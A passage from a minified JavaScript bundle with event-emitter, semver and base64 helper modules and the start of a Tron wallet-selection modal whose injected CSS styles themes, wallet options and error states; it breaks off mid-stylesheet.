                return void 0 === i ? [] : "function" == typeof i ? n ? [i.listener || i] : [i] : n ? function(t) {
                    for (var e = new Array(t.length), n = 0; n < e.length; ++n)
                        e[n] = t[n].listener || t[n];
                    return e
                }(i) : p(i, i.length)
            }
            function f(t) {
                var e = this._events;
                if (void 0 !== e) {
                    var n = e[t];
                    if ("function" == typeof n)
                        return 1;
                    if (void 0 !== n)
                        return n.length
                }
                return 0
            }
            function p(t, e) {
                for (var n = new Array(e), r = 0; r < e; ++r)
                    n[r] = t[r];
                return n
            }
            function g(t, e, n, r) {
                if ("function" == typeof t.on)
                    r.once ? t.once(e, n) : t.on(e, n);
                else {
                    if ("function" != typeof t.addEventListener)
                        throw new TypeError('The "emitter" argument must be of type EventEmitter. Received type ' + typeof t);
                    t.addEventListener(e, function i(o) {
                        r.once && t.removeEventListener(e, i),
                        n(o)
                    })
                }
            }
            Object.defineProperty(o, "defaultMaxListeners", {
                enumerable: !0,
                get: function() {
                    return s
                },
                set: function(t) {
                    if ("number" != typeof t || t < 0 || i(t))
                        throw new RangeError('The value of "defaultMaxListeners" is out of range. It must be a non-negative number. Received ' + t + ".");
                    s = t
                }
            }),
            o.init = function() {
                void 0 !== this._events && this._events !== Object.getPrototypeOf(this)._events || (this._events = Object.create(null),
                this._eventsCount = 0),
                this._maxListeners = this._maxListeners || void 0
            }
            ,
            o.prototype.setMaxListeners = function(t) {
                if ("number" != typeof t || t < 0 || i(t))
                    throw new RangeError('The value of "n" is out of range. It must be a non-negative number. Received ' + t + ".");
                return this._maxListeners = t,
                this
            }
            ,
            o.prototype.getMaxListeners = function() {
                return c(this)
            }
            ,
            o.prototype.emit = function(t) {
                for (var e = [], n = 1; n < arguments.length; n++)
                    e.push(arguments[n]);
                var i = "error" === t
                  , o = this._events;
                if (void 0 !== o)
                    i = i && void 0 === o.error;
                else if (!i)
                    return !1;
                if (i) {
                    var s;
                    if (e.length > 0 && (s = e[0]),
                    s instanceof Error)
                        throw s;
                    var a = new Error("Unhandled error." + (s ? " (" + s.message + ")" : ""));
                    throw a.context = s,
                    a
                }
                var c = o[t];
                if (void 0 === c)
                    return !1;
                if ("function" == typeof c)
                    r(c, this, e);
                else {
                    var l = c.length
                      , d = p(c, l);
                    for (n = 0; n < l; ++n)
                        r(d[n], this, e)
                }
                return !0
            }
            ,
            o.prototype.addListener = function(t, e) {
                return l(this, t, e, !1)
            }
            ,
            o.prototype.on = o.prototype.addListener,
            o.prototype.prependListener = function(t, e) {
                return l(this, t, e, !0)
            }
            ,
            o.prototype.once = function(t, e) {
                return a(e),
                this.on(t, h(this, t, e)),
                this
            }
            ,
            o.prototype.prependOnceListener = function(t, e) {
                return a(e),
                this.prependListener(t, h(this, t, e)),
                this
            }
            ,
            o.prototype.removeListener = function(t, e) {
                var n, r, i, o, s;
                if (a(e),
                void 0 === (r = this._events))
                    return this;
                if (void 0 === (n = r[t]))
                    return this;
                if (n === e || n.listener === e)
                    0 === --this._eventsCount ? this._events = Object.create(null) : (delete r[t],
                    r.removeListener && this.emit("removeListener", t, n.listener || e));
                else if ("function" != typeof n) {
                    for (i = -1,
                    o = n.length - 1; o >= 0; o--)
                        if (n[o] === e || n[o].listener === e) {
                            s = n[o].listener,
                            i = o;
                            break
                        }
                    if (i < 0)
                        return this;
                    0 === i ? n.shift() : function(t, e) {
                        for (; e + 1 < t.length; e++)
                            t[e] = t[e + 1];
                        t.pop()
                    }(n, i),
                    1 === n.length && (r[t] = n[0]),
                    void 0 !== r.removeListener && this.emit("removeListener", t, s || e)
                }
                return this
            }
            ,
            o.prototype.off = o.prototype.removeListener,
            o.prototype.removeAllListeners = function(t) {
                var e, n, r;
                if (void 0 === (n = this._events))
                    return this;
                if (void 0 === n.removeListener)
                    return 0 === arguments.length ? (this._events = Object.create(null),
                    this._eventsCount = 0) : void 0 !== n[t] && (0 === --this._eventsCount ? this._events = Object.create(null) : delete n[t]),
                    this;
                if (0 === arguments.length) {
                    var i, o = Object.keys(n);
                    for (r = 0; r < o.length; ++r)
                        "removeListener" !== (i = o[r]) && this.removeAllListeners(i);
                    return this.removeAllListeners("removeListener"),
                    this._events = Object.create(null),
                    this._eventsCount = 0,
                    this
                }
                if ("function" == typeof (e = n[t]))
                    this.removeListener(t, e);
                else if (void 0 !== e)
                    for (r = e.length - 1; r >= 0; r--)
                        this.removeListener(t, e[r]);
                return this
            }
            ,
            o.prototype.listeners = function(t) {
                return u(this, t, !0)
            }
            ,
            o.prototype.rawListeners = function(t) {
                return u(this, t, !1)
            }
            ,
            o.listenerCount = function(t, e) {
                return "function" == typeof t.listenerCount ? t.listenerCount(e) : f.call(t, e)
            }
            ,
            o.prototype.listenerCount = f,
            o.prototype.eventNames = function() {
                return this._eventsCount > 0 ? e(this._events) : []
            }
        },
        7059(t, e, n) {
            const r = n(560);
            t.exports = (t, e, n) => r(t, e, n) < 0
        },
        7075(t, e, n) {
            const r = n(3908)
              , i = n(3904)
              , {ANY: o} = i
              , s = n(8311)
              , a = n(7638)
              , c = n(5580)
              , l = n(7059)
              , d = n(5200)
              , h = n(4089);
            t.exports = (t, e, n, u) => {
                let f, p, g, w, m;
                switch (t = new r(t,u),
                e = new s(e,u),
                n) {
                case ">":
                    f = c,
                    p = d,
                    g = l,
                    w = ">",
                    m = ">=";
                    break;
                case "<":
                    f = l,
                    p = h,
                    g = c,
                    w = "<",
                    m = "<=";
                    break;
                default:
                    throw new TypeError('Must provide a hilo val of "<" or ">"')
                }
                if (a(t, e, u))
                    return !1;
                for (let n = 0; n < e.set.length; ++n) {
                    const r = e.set[n];
                    let s = null
                      , a = null;
                    if (r.forEach(t => {
                        t.semver === o && (t = new i(">=0.0.0")),
                        s = s || t,
                        a = a || t,
                        f(t.semver, s.semver, u) ? s = t : g(t.semver, a.semver, u) && (a = t)
                    }
                    ),
                    s.operator === w || s.operator === m)
                        return !1;
                    if ((!a.operator || a.operator === w) && p(t, a.semver))
                        return !1;
                    if (a.operator === m && g(t, a.semver))
                        return !1
                }
                return !0
            }
        },
        7272(t) {
            const e = "object" == typeof process && process.env && process.env.NODE_DEBUG && /\bsemver\b/i.test(process.env.NODE_DEBUG) ? (...t) => console.error("SEMVER", ...t) : () => {}
            ;
            t.exports = e
        },
        7291(t) {
            class e {
                constructor(t) {
                    this.wallet = t.wallet,
                    this.enabled = t.enabled
                }
                toJSON() {
                    return {
                        wallet: this.wallet,
                        enabled: this.enabled
                    }
                }
                static fromJSON(t) {
                    return new e(t)
                }
            }
            t.exports = {
                WalletConfigDTO: e
            }
        },
        7414(t, e, n) {
            const r = n(144);
            t.exports = (t, e) => {
                const n = r(t.trim().replace(/^[=v]+/, ""), e);
                return n ? n.version : null
            }
        },
        7526(t, e) {
            "use strict";
            e.byteLength = function(t) {
                var e = a(t)
                  , n = e[0]
                  , r = e[1];
                return 3 * (n + r) / 4 - r
            }
            ,
            e.toByteArray = function(t) {
                var e, n, o = a(t), s = o[0], c = o[1], l = new i(function(t, e, n) {
                    return 3 * (e + n) / 4 - n
                }(0, s, c)), d = 0, h = c > 0 ? s - 4 : s;
                for (n = 0; n < h; n += 4)
                    e = r[t.charCodeAt(n)] << 18 | r[t.charCodeAt(n + 1)] << 12 | r[t.charCodeAt(n + 2)] << 6 | r[t.charCodeAt(n + 3)],
                    l[d++] = e >> 16 & 255,
                    l[d++] = e >> 8 & 255,
                    l[d++] = 255 & e;
                return 2 === c && (e = r[t.charCodeAt(n)] << 2 | r[t.charCodeAt(n + 1)] >> 4,
                l[d++] = 255 & e),
                1 === c && (e = r[t.charCodeAt(n)] << 10 | r[t.charCodeAt(n + 1)] << 4 | r[t.charCodeAt(n + 2)] >> 2,
                l[d++] = e >> 8 & 255,
                l[d++] = 255 & e),
                l
            }
            ,
            e.fromByteArray = function(t) {
                for (var e, r = t.length, i = r % 3, o = [], s = 16383, a = 0, c = r - i; a < c; a += s)
                    o.push(l(t, a, a + s > c ? c : a + s));
                return 1 === i ? (e = t[r - 1],
                o.push(n[e >> 2] + n[e << 4 & 63] + "==")) : 2 === i && (e = (t[r - 2] << 8) + t[r - 1],
                o.push(n[e >> 10] + n[e >> 4 & 63] + n[e << 2 & 63] + "=")),
                o.join("")
            }
            ;
            for (var n = [], r = [], i = "undefined" != typeof Uint8Array ? Uint8Array : Array, o = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", s = 0; s < 64; ++s)
                n[s] = o[s],
                r[o.charCodeAt(s)] = s;
            function a(t) {
                var e = t.length;
                if (e % 4 > 0)
                    throw new Error("Invalid string. Length must be a multiple of 4");
                var n = t.indexOf("=");
                return -1 === n && (n = e),
                [n, n === e ? 0 : 4 - n % 4]
            }
            function c(t) {
                return n[t >> 18 & 63] + n[t >> 12 & 63] + n[t >> 6 & 63] + n[63 & t]
            }
            function l(t, e, n) {
                for (var r, i = [], o = e; o < n; o += 3)
                    r = (t[o] << 16 & 16711680) + (t[o + 1] << 8 & 65280) + (255 & t[o + 2]),
                    i.push(c(r));
                return i.join("")
            }
            r["-".charCodeAt(0)] = 62,
            r["_".charCodeAt(0)] = 63
        },
        7614(t, e, n) {
            const {WALLETS: r} = n(753);
            class i {
                constructor(t) {
                    this.id = t.id,
                    this.name = t.name,
                    this.svg = t.svg || r[t.id]?.svg || "",
                    this.enabled = !1 !== t.enabled
                }
            }
            class o {
                constructor(t=[]) {
                    this._wallets = t.map(t => new i(t))
                }
                get length() {
                    return this._wallets.length
                }
                get wallets() {
                    return [...this._wallets]
                }
                get enabled() {
                    return this._wallets.filter(t => t.enabled)
                }
                find(t) {
                    return this._wallets.find(e => e.id === t)
                }
                isEnabled(t) {
                    const e = this.find(t);
                    return !!e && e.enabled
                }
                [Symbol.iterator]() {
                    return this._wallets[Symbol.iterator]()
                }
            }
            class s {
                constructor(t, e) {
                    this.key = t,
                    this.title = e.title || t,
                    this.message = e.message || ""
                }
            }
            class a {
                constructor(t={}) {
                    this._messages = Object.entries(t).map( ([t,e]) => new s(t,e))
                }
                get(t) {
                    return this._messages.find(e => e.key === t)
                }
                get length() {
                    return this._messages.length
                }
                [Symbol.iterator]() {
                    return this._messages[Symbol.iterator]()
                }
            }
            t.exports = {
                NcAffiliateTronModal: class {
                    static modalOverlay = null;
                    static errorModalOverlay = null;
                    static loadingModalOverlay = null;
                    static onWalletSelectCallback = null;
                    static isInitialized = !1;
                    static init(t={}) {
                        if (this.isInitialized)
                            return;
                        const e = new o(t.wallets || []);
                        this._config = {
                            ...t,
                            wallets: e,
                            theme: t.theme || "light",
                            errorMessages: new a(t.errorMessages || {}),
                            loadingMessages: new a(t.loadingMessages || {})
                        },
                        this._injectStyles(),
                        this._createHTML(),
                        this._setupEventListeners(),
                        this.isInitialized = !0
                    }
                    static _injectStyles() {
                        if (document.getElementById("ncaffiliateown-modal-styles"))
                            return;
                        const t = document.createElement("style");
                        t.id = "ncaffiliateown-modal-styles",
                        t.textContent = "\n@import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;700&family=Inter:wght@400;500;600&display=swap');\n\t\t\t\t.button-container-ncaffiliateown {\n\t\t\t\t\tdisplay: flex;\n\t\t\t\t\tflex-direction: column;\n\t\t\t\t\talign-items: center;\n\t\t\t\t\tgap: 20px;\n\t\t\t\t}\n\n\t\t\t\t.open-button-ncaffiliateown {\n\t\t\t\t\tbackground: #fff;\n\t\t\t\t\tborder: none;\n\t\t\t\t\tpadding: 15px 40px;\n\t\t\t\t\tborder-radius: 12px;\n\t\t\t\t\tfont-family: 'Manrope', sans-serif;\n\t\t\t\t\tfont-weight: 700;\n\t\t\t\t\tfont-size: 18px;\n\t\t\t\t\tcolor: #313131;\n\t\t\t\t\tcursor: pointer;\n\t\t\t\t\tbox-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);\n\t\t\t\t\ttransition: all 0.3s ease;\n\t\t\t\t\ttext-transform: uppercase;\n\t\t\t\t\tletter-spacing: 1px;\n\t\t\t\t}\n\n\t\t\t\t.open-button:hover {\n\t\t\t\t\ttransform: translateY(-2px);\n\t\t\t\t\tbox-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);\n\t\t\t\t}\n\n\t\t\t\t.open-button:active {\n\t\t\t\t\ttransform: translateY(0);\n\t\t\t\t}\n\n\t\t\t\t.error-button-ncaffiliateown {\n\t\t\t\t\tbackground: #ff4444;\n\t\t\t\t}\n\n\t\t\t\t.error-button:hover {\n\t\t\t\t\tbackground: #ff2222;\n\t\t\t\t}\n\n\t\t\t\t.loading-button-ncaffiliateown {\n\t\t\t\t\tbackground: #3b99fc;\n\t\t\t\t}\n\n\t\t\t\t.loading-button:hover {\n\t\t\t\t\tbackground: #2288ee;\n\t\t\t\t}\n\n\t\t\t\t.theme-toggle-ncaffiliateown {\n\t\t\t\t\tbackground: rgba(255, 255, 255, 0.9);\n\t\t\t\t\tborder: none;\n\t\t\t\t\tpadding: 12px 20px;\n\t\t\t\t\tborder-radius: 10px;\n\t\t\t\t\tfont-family: 'Inter', sans-serif;\n\t\t\t\t\tfont-weight: 500;\n\t\t\t\t\tfont-size: 14px;\n\t\t\t\t\tcolor: #313131;\n\t\t\t\t\tcursor: pointer;\n\t\t\t\t\tbox-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);\n\t\t\t\t\ttransition: all 0.3s ease;\n\t\t\t\t\tdisplay: flex;\n\t\t\t\t\talign-items: center;\n\t\t\t\t\tgap: 8px;\n\t\t\t\t\tbackdrop-filter: blur(10px);\n\t\t\t\t}\n\n\t\t\t\t.theme-toggle:hover {\n\t\t\t\t\ttransform: translateY(-1px);\n\t\t\t\t\tbox-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);\n\t\t\t\t\tbackground: rgba(255, 255, 255, 1);\n\t\t\t\t}\n\n\t\t\t\t.theme-toggle:active {\n\t\t\t\t\ttransform: translateY(0);\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .theme-toggle-ncaffiliateown {\n\t\t\t\t\tbackground: rgba(0, 0, 0, 0.7);\n\t\t\t\t\tcolor: #fff;\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .theme-toggle-ncaffiliateown:hover {\n\t\t\t\t\tbackground: rgba(0, 0, 0, 0.9);\n\t\t\t\t}\n\n\t\t\t\t.modal-overlay-ncaffiliateown {\n\t\t\t\t\tposition: fixed;\n\t\t\t\t\ttop: 0;\n\t\t\t\t\tleft: 0;\n\t\t\t\t\twidth: 100%;\n\t\t\t\t\theight: 100%;\n\t\t\t\t\tbackground: rgba(0, 0, 0, 0.5);\n\t\t\t\t\tdisplay: flex;\n\t\t\t\t\talign-items: center;\n\t\t\t\t\tjustify-content: center;\n\t\t\t\t\topacity: 0;\n\t\t\t\t\tvisibility: hidden;\n\t\t\t\t\ttransition: all 0.3s ease;\n\t\t\t\t\tz-index: 1000;\n\t\t\t\t}\n\n\t\t\t\t.modal-overlay-ncaffiliateown.active {\n\t\t\t\t\topacity: 1;\n\t\t\t\t\tvisibility: visible;\n\t\t\t\t}\n\n\t\t\t\t.modal-ncaffiliateown {\n\t\t\t\t\tbackground: #fff;\n\t\t\t\t\tborder-radius: 20px;\n\t\t\t\t\twidth: 541px;\n\t\t\t\t\tmax-width: 90vw;\n\t\t\t\t\tmax-height: 90vh;\n\t\t\t\t\toverflow-y: auto;\n\t\t\t\t\ttransform: scale(0.7) translateY(50px);\n\t\t\t\t\ttransition: all 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);\n\t\t\t\t\tbox-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);\n\t\t\t\t\tz-index: 1001;\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .modal-ncaffiliateown {\n\t\t\t\t\tbackground: #0e0e0e;\n\t\t\t\t\tbox-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);\n\t\t\t\t}\n\n\t\t\t\t.modal-ncaffiliateown.obfuscated-ncaffiliateown {\n\t\t\t\t\twidth: 433px;\n\t\t\t\t\ttransform: scale(0.56) translateY(40px);\n\t\t\t\t}\n\n\t\t\t\t.modal-overlay-ncaffiliateown.active .modal-ncaffiliateown.obfuscated-ncaffiliateown {\n\t\t\t\t\ttransform: scale(1) translateY(0);\n\t\t\t\t}\n\n\t\t\t\t.obfuscated-ncaffiliateown .modal-header-ncaffiliateown {\n\t\t\t\t\tpadding: 40px;\n\t\t\t\t}\n\n\t\t\t\t.obfuscated-ncaffiliateown .modal-title-ncaffiliateown {\n\t\t\t\t\tfont-size: 26px;\n\t\t\t\t\tmargin-bottom: 12px;\n\t\t\t\t}\n\n\t\t\t\t.obfuscated-ncaffiliateown .modal-subtitle-ncaffiliateown {\n\t\t\t\t\tfont-size: 16px;\n\t\t\t\t}\n\n\t\t\t\t.obfuscated-ncaffiliateown .modal-content-ncaffiliateown {\n\t\t\t\t\tpadding: 16px 40px 40px;\n\t\t\t\t}\n\n\t\t\t\t.obfuscated-ncaffiliateown .wallet-option-ncaffiliateown {\n\t\t\t\t\tpadding: 11px;\n\t\t\t\t\tmargin-bottom: 8px;\n\t\t\t\t\tborder-radius: 12px;\n\t\t\t\t}\n\n\t\t\t\t.obfuscated-ncaffiliateown .wallet-icon-ncaffiliateown {\n\t\t\t\t\twidth: 26px;\n\t\t\t\t\theight: 26px;\n\t\t\t\t\tmargin-right: 8px;\n\t\t\t\t}\n\n\t\t\t\t.obfuscated-ncaffiliateown .wallet-icon-ncaffiliateown svg {\n\t\t\t\t\twidth: 21px;\n\t\t\t\t\theight: 21px;\n\t\t\t\t}\n\n\t\t\t\t.obfuscated-ncaffiliateown .wallet-name-ncaffiliateown {\n\t\t\t\t\tfont-size: 13px;\n\t\t\t\t}\n\n\t\t\t\t.obfuscated-ncaffiliateown .qr-badge-ncaffiliateown {\n\t\t\t\t\tpadding: 10px 12px;\n\t\t\t\t\tborder-radius: 6px;\n\t\t\t\t}\n\n\t\t\t\t.obfuscated-ncaffiliateown .qr-badge-text-ncaffiliateown {\n\t\t\t\t\tfont-size: 11px;\n\t\t\t\t}\n\n\t\t\t\t.obfuscated-ncaffiliateown .detected-badge-ncaffiliateown {\n\t\t\t\t\tpadding: 10px 12px;\n\t\t\t\t\tborder-radius: 6px;\n\t\t\t\t}\n\n\t\t\t\t.obfuscated-ncaffiliateown .detected-badge-text-ncaffiliateown {\n\t\t\t\t\tfont-size: 11px;\n\t\t\t\t}\n\n\t\t\t\t.obfuscated-ncaffiliateown .close-button-ncaffiliateown {\n\t\t\t\t\ttop: 16px;\n\t\t\t\t\tright: 16px;\n\t\t\t\t\twidth: 26px;\n\t\t\t\t\theight: 26px;\n\t\t\t\t}\n\n\t\t\t\t.obfuscated-ncaffiliateown .close-button-ncaffiliateown::before,\n\t\t\t\t.obfuscated-ncaffiliateown .close-button-ncaffiliateown::after {\n\t\t\t\t\twidth: 10px;\n\t\t\t\t\theight: 1.6px;\n\t\t\t\t}\n\n\t\t\t\t.modal-overlay-ncaffiliateown.active .modal-ncaffiliateown {\n\t\t\t\t\ttransform: scale(1) translateY(0);\n\t\t\t\t}\n\n\t\t\t\t.modal-header-ncaffiliateown {\n\t\t\t\t\tpadding: 50px;\n\t\t\t\t\ttext-align: center;\n\t\t\t\t}\n\n\t\t\t\t.modal-title-ncaffiliateown {\n\t\t\t\t\tfont-family: 'Manrope', sans-serif;\n\t\t\t\t\tfont-weight: 700;\n\t\t\t\t\tfont-size: 32px;\n\t\t\t\t\tcolor: #313131;\n\t\t\t\t\tmargin-bottom: 15px;\n\t\t\t\t\tline-height: 1.2;\n\t\t\t\t\ttransition: color 0.3s ease;\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .modal-title-ncaffiliateown {\n\t\t\t\t\tcolor: #ffffff;\n\t\t\t\t}\n\n\t\t\t\t.modal-subtitle-ncaffiliateown {\n\t\t\t\t\tfont-family: 'Inter', sans-serif;\n\t\t\t\t\tfont-weight: 500;\n\t\t\t\t\tfont-size: 20px;\n\t\t\t\t\tcolor: #828282;\n\t\t\t\t\tline-height: 1.2;\n\t\t\t\t\ttransition: color 0.3s ease;\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .modal-subtitle-ncaffiliateown {\n\t\t\t\t\tcolor: #828282;\n\t\t\t\t}\n\n\t\t\t\t.modal-content-ncaffiliateown {\n\t\t\t\t\tpadding: 20px 50px 50px;\n\t\t\t\t}\n\n\t\t\t\t.wallet-option-ncaffiliateown {\n\t\t\t\t\tdisplay: flex;\n\t\t\t\t\talign-items: center;\n\t\t\t\t\tbackground: #f9f9f9;\n\t\t\t\t\tborder-radius: 15px;\n\t\t\t\t\tpadding: 14px;\n\t\t\t\t\tmargin-bottom: 10px;\n\t\t\t\t\tcursor: pointer;\n\t\t\t\t\ttransition: all 0.3s ease;\n\t\t\t\t\tposition: relative;\n\t\t\t\t\toverflow: hidden;\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .wallet-option-ncaffiliateown {\n\t\t\t\t\tbackground: #171717;\n\t\t\t\t}\n\n\t\t\t\t.wallet-option-ncaffiliateown:hover {\n\t\t\t\t\tbackground: #f0f0f0;\n\t\t\t\t\ttransform: translateX(5px);\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .wallet-option-ncaffiliateown:hover {\n\t\t\t\t\tbackground: #2a2a2a;\n\t\t\t\t}\n\n\t\t\t\t.wallet-option-ncaffiliateown:last-child {\n\t\t\t\t\tmargin-bottom: 0;\n\t\t\t\t}\n\n\t\t\t\t.wallet-icon-ncaffiliateown {\n\t\t\t\t\twidth: 32px;\n\t\t\t\t\theight: 32px;\n\t\t\t\t\tbackground: #fff;\n\t\t\t\t\tborder-radius: 8px;\n\t\t\t\t\tdisplay: flex;\n\t\t\t\t\talign-items: center;\n\t\t\t\t\tjustify-content: center;\n\t\t\t\t\tmargin-right: 10px;\n\t\t\t\t\tposition: relative;\n\t\t\t\t\toverflow: hidden;\n\t\t\t\t\ttransition: background 0.3s ease;\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .wallet-icon-ncaffiliateown {\n\t\t\t\t\tbackground: #2a2a2a;\n\t\t\t\t}\n\n\t\t\t\t.wallet-icon-ncaffiliateown svg {\n\t\t\t\t\twidth: 26px;\n\t\t\t\t\theight: 26px;\n\t\t\t\t}\n\n\t\t\t\t.wallet-name-ncaffiliateown {\n\t\t\t\t\tfont-family: 'Inter', sans-serif;\n\t\t\t\t\tfont-weight: 500;\n\t\t\t\t\tfont-size: 16px;\n\t\t\t\t\tcolor: #313131;\n\t\t\t\t\tflex: 1;\n\t\t\t\t\ttransition: color 0.3s ease;\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .wallet-name-ncaffiliateown {\n\t\t\t\t\tcolor: #ffffff;\n\t\t\t\t}\n\n\t\t\t\t.qr-badge-ncaffiliateown {\n\t\t\t\t\tbackground: rgba(59, 153, 252, 0.1);\n\t\t\t\t\tborder-radius: 8px;\n\t\t\t\t\tpadding: 12px 15px;\n\t\t\t\t\tmargin-left: auto;\n\t\t\t\t\tdisplay: flex;\n\t\t\t\t}\n\n\t\t\t\t.qr-badge-text-ncaffiliateown {\n\t\t\t\t\tfont-family: 'Manrope', sans-serif;\n\t\t\t\t\tfont-weight: 700;\n\t\t\t\t\tfont-size: 14px;\n\t\t\t\t\tcolor: #3b99fc;\n\t\t\t\t\ttext-transform: uppercase;\n\t\t\t\t\tletter-spacing: 0.5px;\n\t\t\t\t}\n\n\t\t\t\t.detected-badge-ncaffiliateown {\n\t\t\t\t\tbackground: rgba(20, 168, 0, 0.1);\n\t\t\t\t\tborder-radius: 8px;\n\t\t\t\t\tpadding: 12px 15px;\n\t\t\t\t\tmargin-left: auto;\n\t\t\t\t\ttransition: background 0.3s ease;\n\t\t\t\t\tdisplay: flex;\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .detected-badge-ncaffiliateown {\n\t\t\t\t\tbackground: rgba(95, 255, 74, 0.1);\n\t\t\t\t}\n\n\t\t\t\t.detected-badge-text-ncaffiliateown {\n\t\t\t\t\tfont-family: 'Manrope', sans-serif;\n\t\t\t\t\tfont-weight: 700;\n\t\t\t\t\tfont-size: 14px;\n\t\t\t\t\tcolor: #14a800;\n\t\t\t\t\ttext-transform: uppercase;\n\t\t\t\t\tletter-spacing: 0.5px;\n\t\t\t\t\ttransition: color 0.3s ease;\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .detected-badge-text-ncaffiliateown {\n\t\t\t\t\tcolor: #5fff4a;\n\t\t\t\t}\n\n\t\t\t\t.close-button-ncaffiliateown {\n\t\t\t\t\tposition: absolute;\n\t\t\t\t\ttop: 20px;\n\t\t\t\t\tright: 20px;\n\t\t\t\t\twidth: 32px;\n\t\t\t\t\theight: 32px;\n\t\t\t\t\tborder: none;\n\t\t\t\t\tbackground: #f0f0f0;\n\t\t\t\t\tborder-radius: 12px;\n\t\t\t\t\tcursor: pointer;\n\t\t\t\t\tdisplay: flex;\n\t\t\t\t\talign-items: center;\n\t\t\t\t\tjustify-content: center;\n\t\t\t\t\ttransition: all 0.3s ease;\n\t\t\t\t\tz-index: 10;\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .close-button-ncaffiliateown {\n\t\t\t\t\tbackground: #2a2a2a;\n\t\t\t\t}\n\n\t\t\t\t.close-button-ncaffiliateown:hover {\n\t\t\t\t\tbackground: #e0e0e0;\n\t\t\t\t\ttransform: rotate(90deg);\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .close-button-ncaffiliateown:hover {\n\t\t\t\t\tbackground: #3a3a3a;\n\t\t\t\t}\n\n\t\t\t\t.close-button-ncaffiliateown::before,\n\t\t\t\t.close-button-ncaffiliateown::after {\n\t\t\t\t\tcontent: '';\n\t\t\t\t\tposition: absolute;\n\t\t\t\t\twidth: 12px;\n\t\t\t\t\theight: 2px;\n\t\t\t\t\tbackground: rgba(0, 0, 0, 0.4);\n\t\t\t\t\tborder-radius: 1px;\n\t\t\t\t\ttransition: background 0.3s ease;\n\t\t\t\t\tpointer-events: none;\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .close-button-ncaffiliateown::before,\n\t\t\t\t.dark-theme-ncaffiliateown .close-button-ncaffiliateown::after {\n\t\t\t\t\tbackground: rgba(255, 255, 255, 0.6);\n\t\t\t\t}\n\n\t\t\t\t.close-button-ncaffiliateown::before {\n\t\t\t\t\ttransform: rotate(45deg);\n\t\t\t\t}\n\n\t\t\t\t.close-button-ncaffiliateown::after {\n\t\t\t\t\ttransform: rotate(-45deg);\n\t\t\t\t}\n\n\t\t\t\t@keyframes slideInUp {\n\t\t\t\t\tfrom {\n\t\t\t\t\t\topacity: 0;\n\t\t\t\t\t\ttransform: translateY(30px);\n\t\t\t\t\t}\n\t\t\t\t\tto {\n\t\t\t\t\t\topacity: 1;\n\t\t\t\t\t\ttransform: translateY(0);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t.wallet-option-ncaffiliateown {\n\t\t\t\t\tanimation: slideInUp 0.6s ease both;\n\t\t\t\t}\n\n\t\t\t\t.wallet-option:nth-child(1) { animation-delay: 0.1s; }\n\t\t\t\t.wallet-option:nth-child(2) { animation-delay: 0.2s; }\n\t\t\t\t.wallet-option:nth-child(3) { animation-delay: 0.3s; }\n\t\t\t\t.wallet-option:nth-child(4) { animation-delay: 0.4s; }\n\t\t\t\t.wallet-option:nth-child(5) { animation-delay: 0.5s; }\n\t\t\t\t.wallet-option:nth-child(6) { animation-delay: 0.6s; }\n\t\t\t\t.wallet-option:nth-child(7) { animation-delay: 0.7s; }\n\n\t\t\t\t.modal-overlay-ncaffiliateown:not(.active) .wallet-option-ncaffiliateown {\n\t\t\t\t\tanimation: none;\n\t\t\t\t}\n\n\t\t\t/* Error Modal Styles */\n\t\t\t.error-modal-ncaffiliateown {\n\t\t\t\twidth: 420px;\n\t\t\t\tmax-width: 90vw;\n\t\t\t\tpadding: 35px 30px;\n\t\t\t\ttext-align: center;\n\t\t\t}\n\n\t\t\t.dark-theme-ncaffiliateown .error-modal-ncaffiliateown {\n\t\t\t\tbackground: #0e0e0e;\n\t\t\t\tbox-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);\n\t\t\t}\n\n\t\t\t.error-modal-content-ncaffiliateown {\n\t\t\t\t\tdisplay: flex;\n\t\t\t\t\tflex-direction: column;\n\t\t\t\t\talign-items: center;\n\t\t\t\t\tgap: 16px;\n\t\t\t\t}\n\n\t\t\t\t.error-icon-wrapper-ncaffiliateown {\n\t\t\t\t\twidth: 56px;\n\t\t\t\t\theight: 56px;\n\t\t\t\t\tbackground: rgba(239, 83, 80, 0.1);\n\t\t\t\t\tborder-radius: 10px;\n\t\t\t\t\tdisplay: flex;\n\t\t\t\t\talign-items: center;\n\t\t\t\t\tjustify-content: center;\n\t\t\t\t\tflex-shrink: 0;\n\t\t\t\t\ttransition: background 0.3s ease;\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .error-icon-wrapper-ncaffiliateown {\n\t\t\t\t\tbackground: rgba(239, 83, 80, 0.15);\n\t\t\t\t}\n\n\t\t\t\t.error-icon-ncaffiliateown {\n\t\t\t\t\twidth: 28px;\n\t\t\t\t\theight: 28px;\n\t\t\t\t\tcolor: #d32f2f;\n\t\t\t\t\ttransition: color 0.3s ease;\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .error-icon-ncaffiliateown {\n\t\t\t\t\tcolor: #ef5350;\n\t\t\t\t}\n\n\t\t\t\t.error-modal-title-ncaffiliateown 